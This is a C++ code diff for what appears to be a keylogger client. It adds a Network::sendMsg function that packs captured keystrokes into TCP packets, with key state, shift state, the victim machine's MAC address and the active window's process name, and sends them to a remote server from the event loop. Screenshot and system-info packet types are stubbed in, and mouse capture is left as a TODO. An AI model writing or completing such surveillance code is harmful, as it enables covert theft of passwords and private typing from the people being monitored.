@@ -146,6 +146,55 @@ std::int32_t Network::writeCommandResponse()
     return rc;
 }
 
+std::int32_t Network::sendMsg(SystemMsg const &msg) const
+{
+    std::int32_t rc = 0;
+    network::tcp::PacketHeader header;
+
+    header.time = msg.time;
+    header.macAddress = msg.mac;
+    switch (msg.type)
+    {
+    case SystemMsgType::EventKeyboard:
+    {
+        network::tcp::PacketEvent event;
+
+        header.type = network::tcp::PacketType::KeyboardEvent;
+        event.key = msg.event.key;
+        event.state = (msg.event.state == SystemMsgEventState::Down) ? network::tcp::PacketEventState::Down : network::tcp::PacketEventState::Up;
+        event.repeat = 0;
+        event.shift = msg.event.upper;
+        event.processName = msg.currentWindow;
+
+        // Send packet
+        rc |= m_sock->send(&header, sizeof(header));
+        if (!rc)
+        {
+            rc |= m_sock->send(&event, sizeof(event));
+        }
+    }
+    break;
+    case SystemMsgType::EventMouse:
+        // TODO
+        break;
+    case SystemMsgType::Data:
+    {
+        header.type = network::tcp::PacketType::Screenshot;
+    }
+    break;
+    case SystemMsgType::Infos:
+    {
+        header.type = network::tcp::PacketType::Infos;
+    }
+    break;
+    default:
+        throw std::runtime_error("Invalid SystemMessage type");
+        break;
+    }
+
+    return rc;
+}
+
 std::int32_t Network::treatEvents(fd_set const &readfds, fd_set const &writefds, fd_set const &exceptfds)
 {
     std::int32_t const sock = m_sock->getSocket();
@@ -177,7 +226,13 @@ std::int32_t Network::treatEvents(fd_set const &readfds, fd_set const &writefds,
             // Write some datas
             if (!m_sendToNetwork.empty())
             {
-                // Send data
+                // Serialize data
+                SystemMsg const &msg = m_sendToNetwork.front();
+
+                rc = sendMsg(msg);
+
+                // Remove data from the queue
+                m_sendToNetwork.pop();
             }
         }
         if (!rc && FD_ISSET(dataSock, &exceptfds))
